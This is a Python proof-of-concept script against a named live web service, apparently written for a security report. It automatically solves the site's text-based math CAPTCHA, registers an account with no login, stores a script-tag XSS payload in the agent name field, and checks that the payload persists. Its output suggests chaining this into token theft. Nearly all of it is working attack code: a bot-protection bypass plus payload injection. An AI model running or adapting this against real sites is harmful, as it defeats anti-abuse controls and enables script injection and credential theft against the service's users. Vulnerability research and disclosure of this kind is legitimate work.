#!/usr/bin/env python3
"""
AgentOn (agenton.me) — PoC: Unauthenticated Stored XSS in agent `name` (HIGH)
Demonstrates the full chain:
  1. Bypass the natural-language math CAPTCHA via NLP solver (no login needed).
  2. Register an agent with an XSS payload in the `name` field.
  3. Confirm the payload is stored RAW and returned by the API.

Self-contained, read-only (creates a test agent, does not touch other users).
Run from an authorized tester's machine.

Usage:
  python3 agenton_poc_xss_name.py
"""
import re, time, requests

BASE = "https://agenton.me"

UNITS = {"zero":0,"one":1,"two":2,"three":3,"four":4,"five":5,"six":6,"seven":7,"eight":8,
         "nine":9,"ten":10,"eleven":11,"twelve":12,"thirteen":13,"fourteen":14,"fifteen":15,
         "sixteen":16,"seventeen":17,"eighteen":18,"nineteen":19}
TENS = {"twenty":20,"thirty":30,"forty":40,"fifty":50,"sixty":60,"seventy":70,"eighty":80,"ninety":90}
SUB = {"lost","loss","loses","takes","take","took","remove","removes","minus","spent","spend",
       "away","drifted","eat","eats","ate","consume","fewer","fell","drop"}
ADD = {"adds","add","found","finds","gains","gain","has","have","give","gives","put","puts",
       "place","places","more","dropped","brings","bring","leave","leaves","remain","remains"}

def w2n(w):
    w = w.lower().replace("-", " ").split()
    if len(w) == 1:
        return UNITS.get(w[0], TENS.get(w[0]))
    if w[0] in TENS and w[1] in UNITS:
        return TENS[w[0]] + UNITS[w[1]]
    return None

def solve(q):
    t = q.lower()
    def repl(m):
        n = w2n(m.group(0)); return str(n) if n is not None else m.group(0)
    t = re.sub(r'(?:twenty|thirty|forty|fifty|sixty|seventy|eighty|ninety)[ -](?:one|two|three|four|five|six|seven|eight|nine)', repl, t)
    t = re.sub(r'\b(zero|one|two|three|four|five|six|seven|eight|nine|ten|eleven|twelve|thirteen|fourteen|fifteen|sixteen|seventeen|eighteen|nineteen|twenty|thirty|forty|fifty|sixty|seventy|eighty|ninety)\b', repl, t)
    ms = list(re.finditer(r'\d+', t)); total = None
    for m in ms:
        n = int(m.group()); before = t[max(0, m.start()-30):m.start()]
        ctx = " ".join(re.findall(r'[a-z]+', before)[-4:])
        if total is None:
            total = n
        else:
            total = total - n if any(v in ctx for v in SUB) else total + n
    return total

XSS = "<script>alert(document.cookie)</script>"
s = requests.Session(); s.headers.update({"User-Agent":"Mozilla/5.0","Content-Type":"application/json"})

print("=" * 64)
print("AgentOn — Stored XSS in agent name (unauthenticated) PoC")
print("=" * 64)

r = s.post(f"{BASE}/api/agents/register", json={"name": XSS, "description":"xss_poc"})
if r.status_code == 429:
    print("[!] Rate limited. Wait and retry (2/min, 5/hour)."); raise SystemExit(2)
assert r.status_code == 200, f"register failed {r.status_code} {r.text[:120]}"
ch = r.json()
ans = solve(ch["question"])
print(f"[1] CAPTCHA solved: '{ch['question'][:50]}...' -> {ans}")

r2 = s.post(f"{BASE}/api/agents/register/verify", json={"challenge_id": ch["challenge_id"], "challenge_answer": ans})
assert r2.status_code == 200, f"verify failed {r2.status_code} {r2.text[:120]}"
agent = r2.json()
print(f"[2] Agent created: id={agent['id']}, api_key={agent['api_key'][:12]}...")

key = agent["api_key"]
r3 = s.get(f"{BASE}/api/agents/me", headers={"Authorization": f"Bearer {key}"})
stored = r3.json().get("name", "")
print(f"[3] Stored name from API: {stored!r}")
if "<script>" in stored:
    print("\n>>> CONFIRMED: stored XSS payload persisted in agent `name`.")
    print(">>> If the SPA renders `name` via innerHTML/dangerouslySetInnerHTML,")
    print(">>> this is a Stored XSS -> token theft (chain with CORS `*` + localStorage).")
else:
    print("\n>>> Payload not reflected as expected; manual check needed.")
